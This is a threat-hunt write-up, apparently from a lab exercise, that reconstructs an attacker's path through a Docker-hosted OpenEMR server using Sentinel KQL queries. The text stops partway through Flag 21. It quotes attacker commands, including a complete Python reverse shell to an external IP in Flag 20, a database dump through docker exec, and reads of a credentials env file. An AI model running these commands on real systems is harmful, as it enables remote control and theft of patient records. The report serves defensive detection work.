<p align="center">
  <img
    src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*G7OQSDhIPHjPvImOsVCclw.png"
    width="1200"
    alt="Rocky Clinic OpenEMR Threat Hunt Cover"
  />
</p>

# 🛡️ Threat Hunt Report – Rocky Clinic OpenEMR Breach

---

## 📌 Executive Summary

This threat hunt investigated a quiet compromise of Rocky Clinic’s OpenEMR environment hosted on Docker. The activity did not begin with ransomware, outages, or obvious alerts, but instead showed a low-noise attacker moving through the environment like a legitimate administrator. The investigation uncovered remote access abuse, privilege escalation, Docker and database discovery, persistence through identity and systemd services, staged data preparation, successful exfiltration through a third-party SaaS platform, and selective log tampering. This report documents the full attack path, supporting evidence, MITRE ATT&CK mapping, and defensive recommendations.

---

## 🎯 Hunt Objectives

* Identify suspicious activity across host, process, file, network, and alert telemetry
* Reconstruct the attacker’s progression from discovery to exfiltration
* Determine how access was expanded, persisted, and hidden
* Correlate observed behaviors to MITRE ATT&CK techniques
* Document detection gaps and response opportunities

---

## 🧭 Scope & Environment

* Environment: Rocky Clinic OpenEMR
* Platform: OpenEMR hosted on Docker
* Host: `rocky83.zi5bvzlx0idectyt0okhu05hda.cx.internal.cloudapp.net`
* EDR/SIEM: Microsoft Sentinel
* Data Sources: DeviceInfo, DeviceProcessEvents, DeviceFileEvents, DeviceLogonEvents, DeviceNetworkEvents, AlertInfo, AlertEvidence
* Timeframe: `2026-02-04` through `2026-02-14 UTC`

---

## 📚 Table of Contents

* [🧠 Hunt Overview](#-hunt-overview)
* [🧬 MITRE ATT&CK Summary](#-mitre-attck-summary)
* [🔍 Flag Analysis](#-flag-analysis)
* [🚨 Detection Gaps & Recommendations](#-detection-gaps--recommendations)
* [🧾 Final Assessment](#-final-assessment)
* [📎 Analyst Notes](#-analyst-notes)

---

## 🧠 Hunt Overview

The investigation began by validating the OpenEMR host and identifying the runtime layer supporting the application. The attacker first performed quiet discovery, confirmed the Linux distribution, mapped Docker containers and volumes, and then escalated privileges with `sudo -i`. After privilege escalation, they inspected the MariaDB container, read environment files containing database-related configuration, and mapped the physical Docker volume where persistent database storage lived.

The attacker then established persistence in multiple ways. They created an unauthorized identity that blended into the environment, edited local identity files using maintenance-style tools, and created a systemd service named `integration-monitor.service`. That service was later used to launch a Python reverse shell to an external host.

Data was staged into operational-looking locations, archived, and eventually exfiltrated. After failed structured transfer attempts using SSH/SFTP, the attacker pivoted to a third-party SaaS platform using `curl` to upload the staged archive. Finally, the attacker selectively removed log entries with `sed` and backdated `/var/log/messages` to distort the timeline.

---

## 🧬 MITRE ATT&CK Summary

| Flag | Finding                                        | Technique Category                               | MITRE ID          | Priority |
| ---: | ---------------------------------------------- | ------------------------------------------------ | ----------------- | -------- |
|    1 | OpenEMR host identified                        | System Information Discovery                     | T1082             | Medium   |
|    2 | Docker runtime confirmed                       | Software Discovery                               | T1518             | Medium   |
|    3 | First suspicious interactive enumeration       | System Owner/User Discovery                      | T1033             | Medium   |
|    4 | Database work launched through Docker          | Command and Scripting Interpreter                | T1059             | High     |
|    5 | Suspicious remote logon account identified     | Valid Accounts                                   | T1078             | High     |
|    6 | Linux release files read                       | System Information Discovery                     | T1082             | Medium   |
|    7 | RockyLinux identified from EDR                 | System Information Discovery                     | T1082             | Low      |
|    8 | Privileged shell launched with sudo            | Abuse Elevation Control Mechanism                | T1548.003         | High     |
|    9 | Database container inspected                   | Container and Resource Discovery                 | T1613             | High     |
|   10 | Automation env file read                       | Credentials in Files                             | T1552.001         | High     |
|   11 | Docker volume tree enumerated                  | File and Directory Discovery                     | T1083             | Medium   |
|   12 | Database volume path identified                | File and Directory Discovery                     | T1083             | High     |
|   13 | Trusted backup script targeted                 | Scheduled Task/Job Abuse                         | T1053             | High     |
|   14 | Operational staging directory used             | Local Data Staging                               | T1074.001         | High     |
|   15 | Unauthorized account blended in                | Create Account: Local Account                    | T1136.001         | High     |
|   16 | Identity files edited with maintenance tooling | Create Account: Local Account                    | T1136.001         | High     |
|   17 | Systemd service persistence created            | Create or Modify System Process: Systemd Service | T1543.002         | Critical |
|   18 | Persistent artifact created with cat           | Command and Scripting Interpreter                | T1059             | Medium   |
|   19 | Armed service file version identified          | Systemd Service Persistence                      | T1543.002         | Critical |
|   20 | Python reverse shell executed                  | Python                                           | T1059.006         | Critical |
|   21 | Interactive shell spawned                      | Unix Shell                                       | T1059.004         | Critical |
|   22 | Staged archive identified                      | Archive Collected Data                           | T1560             | High     |
|   23 | Failed structured transfer attempt             | Exfiltration Over Alternative Protocol           | T1048             | High     |
|   24 | Successful SaaS exfiltration with curl         | Exfiltration to Cloud Storage                    | T1567             | Critical |
|   25 | Exfiltration endpoint identified               | Exfiltration Over Web Service                    | T1567             | Critical |
|   26 | Selective log deletion counted                 | Indicator Removal on Host                        | T1070             | High     |
|   27 | sed used for log manipulation                  | Indicator Removal on Host                        | T1070             | High     |
|   28 | Log timestamp backdated                        | Timestomp                                        | T1070.006         | High     |
|   29 | EDR alert classification confirmed             | Indicator Removal / Timestomp                    | T1070 / T1070.006 | High     |

---

## 🔍 Flag Analysis

*All flags below are collapsible for readability.*

---

<details>
<summary id="-flag-1">🚩 <strong>Flag 1: Initial Asset Anchor</strong></summary>

### 🎯 Objective

Identify the fully qualified device name of the system hosting the OpenEMR environment.

### 📌 Finding

File events tied to the OpenEMR application directory identified the host as:

`rocky83.zi5bvzlx0idectyt0okhu05hda.cx.internal.cloudapp.net`

### 🔍 Evidence

| Field           | Value                                                       |
| --------------- | ----------------------------------------------------------- |
| Host            | rocky83                                                     |
| DeviceName      | rocky83.zi5bvzlx0idectyt0okhu05hda.cx.internal.cloudapp.net |
| Evidence Source | DeviceFileEvents                                            |
| Relevant Path   | `/var/www/localhost/htdocs/openemr`                         |

### 💡 Why it matters

Validating the correct host established the anchor for the rest of the investigation and prevented unrelated system activity from polluting the timeline.

### 🔧 KQL Query Used

```kql
DeviceFileEvents
| where Timestamp between (datetime(2026-02-04T00:00:00Z) .. datetime(2026-02-14T00:00:00Z))
| where FolderPath has "openemr"
| project Timestamp, DeviceName, FolderPath, FileName, ActionType
| order by Timestamp asc
```

### 🖼️ Screenshot

<p align="center">
  <img src="assets/Flag 1_RockyClinicOpenEMR.png" width="900" alt="Flag 1 Screenshot">
</p>

### 🛠️ Detection Recommendation

Monitor file activity against sensitive application directories and correlate the device name with process, network, and logon telemetry.

</details>

---

<details>
<summary id="-flag-2">🚩 <strong>Flag 2: Hosting Model Confirmation</strong></summary>

### 🎯 Objective

Identify the runtime layer hosting the OpenEMR application.

### 📌 Finding

The OpenEMR application was running on Docker.

### 🔍 Evidence

| Field            | Value                         |
| ---------------- | ----------------------------- |
| Runtime          | Docker                        |
| Command Evidence | `docker ps`, `sudo docker ps` |
| Host             | rocky83                       |

### 💡 Why it matters

Identifying Docker as the runtime layer helped scope the investigation to containers, Docker volumes, and container-specific persistence opportunities.

### 🔧 KQL Query Used

```kql
DeviceProcessEvents
| where Timestamp between (datetime(2026-02-04T00:00:00Z) .. datetime(2026-02-14T00:00:00Z))
| where DeviceName has "rocky83"
| where ProcessCommandLine has_any ("docker", "openemr")
| project Timestamp, AccountName, FileName, ProcessCommandLine, ProcessId
| order by Timestamp asc
```

### 🖼️ Screenshot

<p align="center">
  <img src="assets/Flag 2_RockyClinicOpenEMR.png" width="900" alt="Flag 2 Screenshot">
</p>

### 🛠️ Detection Recommendation

Alert on unexpected Docker enumeration commands from non-container-admin accounts.

</details>

---

<details>
<summary id="-flag-3">🚩 <strong>Flag 3: First Behavioral Tell</strong></summary>

### 🎯 Objective

Identify the first suspicious interactive enumeration command in the suspicious remote session.

### 📌 Finding

The attacker used `w` to check who was logged into the host. The process ID was:

`17507`

### 🔍 Evidence

| Field                 | Value             |
| --------------------- | ----------------- |
| Account               | it.admin          |
| Remote Session Anchor | External IP logon |
| Process               | w                 |
| Process ID            | 17507             |
| Command Line          | `w`               |

### 💡 Why it matters

The `w` command showed early hands-on-keyboard behavior. It confirmed that the operator was checking active users before performing louder activity.

### 🔧 KQL Query Used

```kql
DeviceProcessEvents
| where Timestamp between (datetime(2026-02-08T16:25:00Z) .. datetime(2026-02-08T16:40:00Z))
| where DeviceName has "rocky83"
| where AccountName == "it.admin"
| where FileName in~ ("who", "w", "users", "last")
| project Timestamp, FileName, ProcessCommandLine, ProcessId
| order by Timestamp asc
```

### 🖼️ Screenshot

<p align="center">
  <img src="assets/Flag 3_RockyClinicOpenEMR.png" width="900" alt="Flag 3 Screenshot">
</p>

### 🛠️ Detection Recommendation

Create detections for interactive enumeration commands following unusual remote logons.

</details>

---

<details>
<summary id="-flag-4">🚩 <strong>Flag 4: Database Work Through Docker</strong></summary>

### 🎯 Objective

Identify the binary hash tied to the database work against the EHR database.

### 📌 Finding

The database work was executed through Docker using a `mysqldump` command against the MariaDB container. The SHA256 was:

`a7b78ff3f501951cd8455697ef1b6dc1832ae42a9433926a8504d6ad719d729d`

### 🔍 Evidence

| Field   | Value                                                              |
| ------- | ------------------------------------------------------------------ |
| Binary  | docker                                                             |
| Command | `docker exec openemr-mariadb mysqldump -u r0ckyHealth r0ckyHealth` |
| SHA256  | a7b78ff3f501951cd8455697ef1b6dc1832ae42a9433926a8504d6ad719d729d   |

### 💡 Why it matters

This showed that the attacker was not only discovering the database but actively extracting database content through the container runtime.

### 🔧 KQL Query Used

```kql
DeviceProcessEvents
| where Timestamp between (datetime(2026-02-10T06:37:30Z) .. datetime(2026-02-10T06:37:32Z))
| where DeviceName has "rocky83"
| where AccountName == "it.admin"
| where FileName == "docker"
| where ProcessCommandLine has "mysqldump"
| project Timestamp, FileName, ProcessCommandLine, ProcessId, SHA256
```

### 🖼️ Screenshot

<p align="center">
  <img src="assets/Flag 4_RockyClinicOpenEMR.png" width="900" alt="Flag 4 Screenshot">
</p>

### 🛠️ Detection Recommendation

Alert on `docker exec` commands invoking database utilities such as `mysqldump`, `mariadb`, or `mysql`.

</details>

---

<details>
<summary id="-flag-5">🚩 <strong>Flag 5: Account Name Attribution</strong></summary>

### 🎯 Objective

Identify the account behind the suspicious remote sessions.

### 📌 Finding

The suspicious remote logons were tied to:

`it.admin`

### 🔍 Evidence

| Field                 | Value                 |
| --------------------- | --------------------- |
| Account               | it.admin              |
| Logon Type            | Network               |
| Suspicious Remote IPs | Multiple external IPs |
| Source Table          | DeviceLogonEvents     |

### 💡 Why it matters

The attacker used an account that looked like a legitimate administrative identity, making the activity blend into normal IT operations.

### 🔧 KQL Query Used

```kql
DeviceLogonEvents
| where Timestamp between (datetime(2026-02-04T00:00:00Z) .. datetime(2026-02-14T00:00:00Z))
| where DeviceName has "rocky83"
| where ActionType == "LogonSuccess"
| summarize FirstSeen=min(Timestamp), LastSeen=max(Timestamp), Count=count()
    by AccountName, RemoteIP, LogonType
| order by FirstSeen asc
```

### 🖼️ Screenshot

<p align="center">
  <img src="assets/Flag 5_RockyClinicOpenEMR.png" width="900" alt="Flag 5 Screenshot">
</p>

### 🛠️ Detection Recommendation

Baseline remote IP usage by privileged accounts and alert when a privileged account authenticates from new or unusual external IPs.

</details>

---

<details>
<summary id="-flag-6">🚩 <strong>Flag 6: Environment Confirmation</strong></summary>

### 🎯 Objective

Determine how many `/etc` release files were read during host fingerprinting.

### 📌 Finding

The operator read four distinct release files:

`/etc/os-release`
`/etc/redhat-release`
`/etc/rocky-release`
`/etc/system-release`

### 🔍 Evidence

| Field   | Value                                                                            |
| ------- | -------------------------------------------------------------------------------- |
| Command | `cat /etc/os-release /etc/redhat-release /etc/rocky-release /etc/system-release` |
| Count   | 4                                                                                |

### 💡 Why it matters

Reading OS release files confirmed host fingerprinting and platform awareness before further actions.

### 🔧 KQL Query Used

```kql
DeviceProcessEvents
| where Timestamp between (datetime(2026-02-04T00:00:00Z) .. datetime(2026-02-14T00:00:00Z))
| where DeviceName has "rocky83"
| where AccountName == "it.admin"
| where ProcessCommandLine has "/etc"
| where ProcessCommandLine has "release"
| project Timestamp, FileName, ProcessCommandLine, ProcessId
| order by Timestamp asc
```

### 🖼️ Screenshot

<p align="center">
  <img src="assets/Flag 6_RockyClinicOpenEMR.png" width="900" alt="Flag 6 Screenshot">
</p>

### 🛠️ Detection Recommendation

Monitor chained reads of multiple OS fingerprinting files during remote sessions.

</details>

---

<details>
<summary id="-flag-7">🚩 <strong>Flag 7: Platform Reality Check</strong></summary>

### 🎯 Objective

Identify the operating system distribution recorded by EDR.

### 📌 Finding

DeviceInfo recorded the OS distribution as:

`RockyLinux`

### 🔍 Evidence

| Field          | Value      |
| -------------- | ---------- |
| OSPlatform     | Linux      |
| OSDistribution | RockyLinux |
| OSVersion      | 9.6        |

### 💡 Why it matters

Validating the OS through EDR confirmed the platform independently of attacker-executed commands.

### 🔧 KQL Query Used

```kql
DeviceInfo
| where Timestamp between (datetime(2026-02-04T00:00:00Z) .. datetime(2026-02-14T00:00:00Z))
| where DeviceName has "rocky83"
| project Timestamp, DeviceName, OSPlatform, OSDistribution, OSVersion
| order by Timestamp asc
```

### 🖼️ Screenshot

<p align="center">
  <img src="assets/Flag 7_RockyClinicOpenEMR.png" width="900" alt="Flag 7 Screenshot">
</p>

### 🛠️ Detection Recommendation

Use EDR asset metadata to validate attacker-discovered host context.

</details>

---

<details>
<summary id="-flag-8">🚩 <strong>Flag 8: Crossing the Trust Line</strong></summary>

### 🎯 Objective

Identify the command that transitioned the operator into a privileged interactive shell.

### 📌 Finding

The operator escalated privileges using:

`sudo -i`

### 🔍 Evidence

| Field        | Value     |
| ------------ | --------- |
| Account      | it.admin  |
| Process      | sudo      |
| Command Line | `sudo -i` |

### 💡 Why it matters

This command gave the operator a privileged shell and allowed deeper access to Docker, system files, services, and logs.

### 🔧 KQL Query Used

```kql
DeviceProcessEvents
| where Timestamp between (datetime(2026-02-04T00:00:00Z) .. datetime(2026-02-14T00:00:00Z))
| where DeviceName has "rocky83"
| where AccountName == "it.admin"
| where ProcessCommandLine has_any ("sudo -i", "sudo su", "sudo bash")
| project Timestamp, AccountName, FileName, ProcessCommandLine, ProcessId
| order by Timestamp asc
```

### 🖼️ Screenshot

<p align="center">
  <img src="assets/Flag 8_RockyClinicOpenEMR.png" width="900" alt="Flag 8 Screenshot">
</p>

### 🛠️ Detection Recommendation

Alert on `sudo -i` usage by accounts that recently authenticated from unusual remote IPs.

</details>

---

<details>
<summary id="-flag-9">🚩 <strong>Flag 9: Runtime Layer Interrogation</strong></summary>

### 🎯 Objective

Identify the command used to inspect the database container.

### 📌 Finding

The attacker inspected the MariaDB container using:

`docker inspect openemr-mariadb`

### 🔍 Evidence

| Field        | Value                            |
| ------------ | -------------------------------- |
| Account      | root                             |
| Runtime      | Docker                           |
| Command Line | `docker inspect openemr-mariadb` |

### 💡 Why it matters

The attacker confirmed container configuration before interacting with database data.

### 🔧 KQL Query Used

```kql
DeviceProcessEvents
| where Timestamp between (datetime(2026-02-04T00:00:00Z) .. datetime(2026-02-14T00:00:00Z))
| where DeviceName has "rocky83"
| where AccountName == "root"
| where ProcessCommandLine has "docker inspect"
| where ProcessCommandLine has "openemr-mariadb"
| project Timestamp, AccountName, FileName, ProcessCommandLine, ProcessId
| order by Timestamp asc
```

### 🖼️ Screenshot

<p align="center">
  <img src="assets/Flag 9_RockyClinicOpenEMR.png" width="900" alt="Flag 9 Screenshot">
</p>

### 🛠️ Detection Recommendation

Monitor `docker inspect` against database containers, especially after privilege escalation.

</details>

---

<details>
<summary id="-flag-10">🚩 <strong>Flag 10: Credentials in Automation Env File</strong></summary>

### 🎯 Objective

Identify the command that read the privileged automation environment file.

### 📌 Finding

The attacker read an environment file under `/etc` using:

`sed -n 1,200p /etc/openemr/audit_export.env`

### 🔍 Evidence

| Field        | Value                                         |
| ------------ | --------------------------------------------- |
| File         | `/etc/openemr/audit_export.env`               |
| Process      | sed                                           |
| Command Line | `sed -n 1,200p /etc/openemr/audit_export.env` |
| MITRE        | T1552.001 Credentials in Files                |

### 💡 Why it matters

Environment files often contain database credentials, tokens, or operational secrets. This read likely helped the attacker access sensitive data.

### 🔧 KQL Query Used

```kql
DeviceProcessEvents
| where Timestamp between (datetime(2026-02-04T00:00:00Z) .. datetime(2026-02-14T00:00:00Z))
| where DeviceName has "rocky83"
| where ProcessCommandLine has "/etc/openemr/audit_export.env"
| project Timestamp, AccountName, FileName, ProcessCommandLine, ProcessId
| order by Timestamp asc
```

### 🖼️ Screenshot

<p align="center">
  <img src="assets/Flag 10_RockyClinicOpenEMR.png" width="900" alt="Flag 10 Screenshot">
</p>

### 🛠️ Detection Recommendation

Alert on reads of sensitive `.env` files under `/etc`, especially by interactive users.

</details>

---

<details>
<summary id="-flag-11">🚩 <strong>Flag 11: Physical Mapping Confirmation</strong></summary>

### 🎯 Objective

Identify the command that recursively enumerated files inside Docker volume storage.

### 📌 Finding

The attacker used:

`find /var/lib/docker/volumes -maxdepth 3 -type f`

### 🔍 Evidence

| Field        | Value                                              |
| ------------ | -------------------------------------------------- |
| Binary       | find                                               |
| Path         | `/var/lib/docker/volumes`                          |
| Command Line | `find /var/lib/docker/volumes -maxdepth 3 -type f` |

### 💡 Why it matters

This command mapped physical Docker volume storage and helped the attacker understand where persistent container data lived.

### 🔧 KQL Query Used

```kql
DeviceProcessEvents
| where Timestamp between (datetime(2026-02-04T00:00:00Z) .. datetime(2026-02-14T00:00:00Z))
| where DeviceName has "rocky83"
| where FileName == "find"
| where ProcessCommandLine startswith "find /var/lib/docker/volumes"
| project Timestamp, AccountName, ProcessCommandLine, ProcessId
| order by Timestamp asc
```

### 🖼️ Screenshot

<p align="center">
  <img src="assets/Flag 11_RockyClinicOpenEMR.png" width="900" alt="Flag 11 Screenshot">
</p>

### 🛠️ Detection Recommendation

Monitor recursive discovery commands against `/var/lib/docker/volumes`.

</details>

---

<details>
<summary id="-flag-12">🚩 <strong>Flag 12: Database Storage Path</strong></summary>

### 🎯 Objective

Identify the host filesystem path where the persistent database storage lived.

### 📌 Finding

The MariaDB data volume path was:

`/var/lib/docker/volumes/r0ckyyy335_mariadb_data/_data`

### 🔍 Evidence

| Field     | Value                                                   |
| --------- | ------------------------------------------------------- |
| Volume    | r0ckyyy335_mariadb_data                                 |
| Host Path | `/var/lib/docker/volumes/r0ckyyy335_mariadb_data/_data` |

### 💡 Why it matters

Mapping logical database containers to physical disk paths gave the attacker direct knowledge of where persistent database data lived.

### 🔧 KQL Query Used

```kql
DeviceProcessEvents
| where Timestamp between (datetime(2026-02-04T00:00:00Z) .. datetime(2026-02-14T00:00:00Z))
| where DeviceName has "rocky83"
| where ProcessCommandLine has_any ("mariadb", "/var/lib/docker/volumes")
| project Timestamp, AccountName, ProcessCommandLine, ProcessId
| order by Timestamp asc
```

### 🖼️ Screenshot

<p align="center">
  <img src="assets/Flag 12_RockyClinicOpenEMR.png" width="900" alt="Flag 12 Screenshot">
</p>

### 🛠️ Detection Recommendation

Restrict and alert on host-level access to Docker volume paths.

</details>

---

<details>
<summary id="-flag-13">🚩 <strong>Flag 13: Hijacking a Trusted Repeating Path</strong></summary>

### 🎯 Objective

Identify the trusted operational script targeted for staging.

### 📌 Finding

The trusted script was:

`/opt/backup/scripts/backup_manifest.sh`

### 🔍 Evidence

| Field            | Value                                                       |
| ---------------- | ----------------------------------------------------------- |
| Path             | `/opt/backup/scripts/backup_manifest.sh`                    |
| Account Context  | svc.backup                                                  |
| Command Evidence | `sudo -u svc.backup /opt/backup/scripts/backup_manifest.sh` |

### 💡 Why it matters

The attacker attempted to leverage a trusted recurring backup path to blend staging activity into normal operational workflows.

### 🔧 KQL Query Used

```kql
DeviceProcessEvents
| where Timestamp between (datetime(2026-02-04T00:00:00Z) .. datetime(2026-02-14T00:00:00Z))
| where DeviceName has "rocky83"
| where ProcessCommandLine has "backup_manifest.sh"
| project Timestamp, AccountName, FileName, ProcessCommandLine, ProcessId
| order by Timestamp asc
```

### 🖼️ Screenshot

<p align="center">
  <img src="assets/Flag 13_RockyClinicOpenEMR.png" width="900" alt="Flag 13 Screenshot">
</p>

### 🛠️ Detection Recommendation

Monitor changes and execution of backup scripts under `/opt`, especially when ownership or permissions change.

</details>

---

<details>
<summary id="-flag-14">🚩 <strong>Flag 14: Staging Where Nobody Looks First</strong></summary>

### 🎯 Objective

Identify the directory used for staging prep.

### 📌 Finding

The attacker staged data in:

`/var/lib/integrations`

### 🔍 Evidence

| Field           | Value                                                                             |
| --------------- | --------------------------------------------------------------------------------- |
| Directory       | `/var/lib/integrations`                                                           |
| Archive         | `integration_state_2026-02-10_22-00-01.tar.gz`                                    |
| Related Command | `tar -czf /var/lib/integrations/integration_state_2026-02-10_22-00-01.tar.gz ...` |

### 💡 Why it matters

The directory looked operational and blended into normal integration-related host activity.

### 🔧 KQL Query Used

```kql
DeviceProcessEvents
| where Timestamp between (datetime(2026-02-04T00:00:00Z) .. datetime(2026-02-14T00:00:00Z))
| where DeviceName has "rocky83"
| where FileName == "tar"
| where ProcessCommandLine has_any ("integration_state", "/var/lib/integrations")
| project Timestamp, AccountName, ProcessCommandLine, ProcessId
| order by Timestamp asc
```

### 🖼️ Screenshot

<p align="center">
  <img src="assets/Flag 14_RockyClinicOpenEMR.png" width="900" alt="Flag 14 Screenshot">
</p>

### 🛠️ Detection Recommendation

Alert on archive creation under operational directories that are not approved backup destinations.

</details>

---

<details>
<summary id="-flag-15">🚩 <strong>Flag 15: Quiet Persistence Obfuscation</strong></summary>

### 🎯 Objective

Identify the unauthorized account.

### 📌 Finding

The unauthorized account was:

`system`

### 🔍 Evidence

| Field    | Value                             |
| -------- | --------------------------------- |
| Account  | system                            |
| Behavior | Unusual successful logon activity |
| Source   | DeviceLogonEvents                 |

### 💡 Why it matters

The account name blended into the environment by appearing system-like, which reduced the chance of manual detection.

### 🔧 KQL Query Used

```kql
DeviceLogonEvents
| where Timestamp between (datetime(2026-02-04T00:00:00Z) .. datetime(2026-02-14T00:00:00Z))
| where DeviceName has "rocky83"
| where ActionType == "LogonSuccess"
| summarize TotalLogons=count(), FirstSeen=min(Timestamp), LastSeen=max(Timestamp),
    LogonTypes=make_set(LogonType), RemoteIPs=make_set(RemoteIP)
    by AccountName
| order by TotalLogons asc
```

### 🖼️ Screenshot

<p align="center">
  <img src="assets/Flag 15_RockyClinicOpenEMR.png" width="900" alt="Flag 15 Screenshot">
</p>

### 🛠️ Detection Recommendation

Flag newly observed local accounts that use system-like names such as `system`, `daemon`, or service-like naming patterns.

</details>

---

<details>
<summary id="-flag-16">🚩 <strong>Flag 16: Identity Creation Without Obvious Footprints</strong></summary>

### 🎯 Objective

Identify the SHA256 of the binary used to create or modify the identity without standard account-management tools.

### 📌 Finding

The attacker used `vipw` to edit local identity files. The SHA256 was confirmed from file write evidence.

### 🔍 Evidence

| Field        | Value                                   |
| ------------ | --------------------------------------- |
| Binary       | vipw                                    |
| Target Files | `/etc/passwd`, `/etc/shadow`            |
| Behavior     | Maintenance-style identity file editing |

### 💡 Why it matters

Using `vipw` avoided obvious `useradd` or `adduser` detections while still modifying account identity files.

### 🔧 KQL Query Used

```kql
DeviceFileEvents
| where Timestamp between (datetime(2026-02-04T00:00:00Z) .. datetime(2026-02-14T00:00:00Z))
| where DeviceName has "rocky83"
| where FolderPath in~ ("/etc/passwd", "/etc/shadow", "/etc/group", "/etc/gshadow")
| where InitiatingProcessFileName !in~ ("useradd", "adduser", "usermod", "passwd", "groupadd")
| project Timestamp, FolderPath, ActionType, InitiatingProcessFileName,
          InitiatingProcessCommandLine, InitiatingProcessSHA256
| order by Timestamp asc
```

### 🖼️ Screenshot

<p align="center">
  <img src="assets/Flag 16_RockyClinicOpenEMR.png" width="900" alt="Flag 16 Screenshot">
</p>

### 🛠️ Detection Recommendation

Alert when `vipw`, `vim`, `sed`, `tee`, `cp`, or `mv` modify local identity files.

</details>

---

<details>
<summary id="-flag-17">🚩 <strong>Flag 17: Secondary Non-Interactive Persistence</strong></summary>

### 🎯 Objective

Identify the systemd artifact used for persistence.

### 📌 Finding

The artifact was:

`integration-monitor.service`

### 🔍 Evidence

| Field            | Value                                             |
| ---------------- | ------------------------------------------------- |
| Path             | `/etc/systemd/system/integration-monitor.service` |
| Artifact         | integration-monitor.service                       |
| Persistence Type | systemd service                                   |

### 💡 Why it matters

Systemd services provide execution without an interactive logon and can blend in with normal host service activity.

### 🔧 KQL Query Used

```kql
DeviceFileEvents
| where Timestamp between (datetime(2026-02-04T00:00:00Z) .. datetime(2026-02-14T00:00:00Z))
| where DeviceName has "rocky83"
| where FolderPath has "/etc/systemd/system/"
| where FileName endswith ".service"
| project Timestamp, FolderPath, FileName, ActionType, InitiatingProcessCommandLine
| order by Timestamp asc
```

### 🖼️ Screenshot

<p align="center">
  <img src="assets/Flag 17_RockyClinicOpenEMR.png" width="900" alt="Flag 17 Screenshot">
</p>

### 🛠️ Detection Recommendation

Alert on new or modified unit files under `/etc/systemd/system`.

</details>

---

<details>
<summary id="-flag-18">🚩 <strong>Flag 18: No Editor File Creation</strong></summary>

### 🎯 Objective

Identify the binary used to create the persistent artifact without editor telemetry.

### 📌 Finding

The binary was:

`cat`

### 🔍 Evidence

| Field           | Value                                             |
| --------------- | ------------------------------------------------- |
| Binary          | cat                                               |
| Target Artifact | integration-monitor.service                       |
| Path            | `/etc/systemd/system/integration-monitor.service` |

### 💡 Why it matters

Creating files with simple binaries like `cat` can reduce visibility compared to editor-based changes.

### 🔧 KQL Query Used

```kql
DeviceFileEvents
| where Timestamp between (datetime(2026-02-04T00:00:00Z) .. datetime(2026-02-14T00:00:00Z))
| where DeviceName has "rocky83"
| where FolderPath has "/etc/systemd/system/integration-monitor.service"
| project Timestamp, ActionType, FolderPath, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp asc
```

### 🖼️ Screenshot

<p align="center">
  <img src="assets/Flag 18_RockyClinicOpenEMR.png" width="900" alt="Flag 18 Screenshot">
</p>

### 🛠️ Detection Recommendation

Monitor shell redirection and simple file creation utilities writing to systemd directories.

</details>

---

<details>
<summary id="-flag-19">🚩 <strong>Flag 19: Pre-Activation Integrity Check</strong></summary>

### 🎯 Objective

Identify the SHA256 of the service file version used to launch the C2 connection.

### 📌 Finding

The service file version used before activation had SHA256:

`f71ea834a9be0fb0e90c7b496e5312072fffedf1d1c0377957e05714bdac37b8`

### 🔍 Evidence

| Field   | Value                                                            |
| ------- | ---------------------------------------------------------------- |
| File    | integration-monitor.service                                      |
| SHA256  | f71ea834a9be0fb0e90c7b496e5312072fffedf1d1c0377957e05714bdac37b8 |
| Context | Version aligned to service restart before C2 launch              |

### 💡 Why it matters

The service file changed across its lifecycle. Matching the correct version to the activation moment proved which configuration launched outbound control.

### 🔧 KQL Query Used

```kql
DeviceFileEvents
| where Timestamp between (datetime(2026-02-10T00:00:00Z) .. datetime(2026-02-12T00:00:00Z))
| where DeviceName has "rocky83"
| where FolderPath has "/etc/systemd/system/integration-monitor.service"
| summarize FirstSeen=min(Timestamp), LastSeen=max(Timestamp),
    Actions=make_set(ActionType), Commands=make_set(InitiatingProcessCommandLine)
    by SHA256
| order by FirstSeen asc
```

### 🖼️ Screenshot

<p align="center">
  <img src="assets/Flag 19_RockyClinicOpenEMR.png" width="900" alt="Flag 19 Screenshot">
</p>

### 🛠️ Detection Recommendation

Track hashes of systemd unit files over time and correlate service restarts to file versions.

</details>

---

<details>
<summary id="-flag-20">🚩 <strong>Flag 20: Outbound Control Command</strong></summary>

### 🎯 Objective

Identify the process command line that initiated the reverse shell.

### 📌 Finding

The attacker launched a Python reverse shell:

`/usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("20.62.27.80",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`

### 🔍 Evidence

| Field       | Value         |
| ----------- | ------------- |
| Binary      | python3       |
| Remote IP   | 20.62.27.80   |
| Remote Port | 443           |
| Behavior    | Reverse shell |

### 💡 Why it matters

This command established outbound interactive control from the host to an external server.

### 🔧 KQL Query Used

```kql
DeviceProcessEvents
| where Timestamp between (datetime(2026-02-04T00:00:00Z) .. datetime(2026-02-14T00:00:00Z))
| where DeviceName has "rocky83"
| where ProcessCommandLine has "socket"
| where ProcessCommandLine has "dup2"
| project Timestamp, AccountName, FileName, ProcessCommandLine, ProcessId
| order by Timestamp asc
```

### 🖼️ Screenshot

<p align="center">
  <img src="assets/Flag 20_RockyClinicOpenEMR.png" width="900" alt="Flag 20 Screenshot">
</p>

### 🛠️ Detection Recommendation

Alert on Python one-liners containing `socket`, `dup2`, and interactive shell execution.

</details>

---

<details>
<summary id="-flag-21">🚩 <strong>Flag 21: Reverse Shell Process Identification</strong></summary>

### 🎯 Objective

Identify the interactive shell process spawned by the Python reverse shell.

### 📌 Finding

The interactive shell process ID was:

`8000`

### 🔍 Evidence

| Field          | Value        |
| -------------- | ------------ |
| Parent Process | python3      |
| Child Shell    | `/bin/sh -i` |
| Process ID     | 8000         |

### 💡 Why it matters

The Python process established the connection, but the shell process represented the interactive operator session.

### 🔧 KQL Query Used

```kql
let py =
DeviceProcessEvents
| where Timestamp between (datetime(2026-02-04T00:00:00Z) .. datetime(2026-02-14T00:00:00Z))
| where DeviceName has "rocky83"
| where AccountName == "it.admin"
| where ProcessCommandLine has "/usr/bin/python3 -c"
| where ProcessCommandLine has "20.62.27.80"
| where ProcessCommandLine has "subprocess.call"
| project PyTime=Timestamp, PyPid=ProcessId;

let shells =
DeviceProcessEvents
| where Timestamp between (datetime(2026-02-04T00:00:00Z) .. datetime(2026-02-14T00:00:00Z))
| where DeviceName has "rocky83"
| where AccountName == "it.admin"
| where ProcessCommandLine == "/bin/sh -i"
| project ShellTime=Timestamp, ShellPid=ProcessId, ShellCmd=ProcessCommandLine;

py
